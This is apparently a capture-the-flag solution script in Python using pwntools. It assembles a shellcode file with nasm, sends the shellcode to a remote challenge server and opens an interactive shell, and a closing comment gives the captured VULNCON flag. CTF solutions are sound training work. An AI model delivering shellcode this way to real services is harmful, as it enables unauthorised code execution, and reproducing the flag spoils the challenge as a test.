
from pwn import *

r = process(['nasm', './shell.asm'])

r.close()

sleep(1)

with open('./shell', 'rb') as f:
    sh = f.read()

# r = process('./More_than_shellcoding')
r = remote('35.228.15.118', 1338)

r.readline()
r.sendline(sh)

r.interactive()

# VULNCON{Gu355_u_d0nt_n33d_th3_5y5c4ll_aft3r4ll}
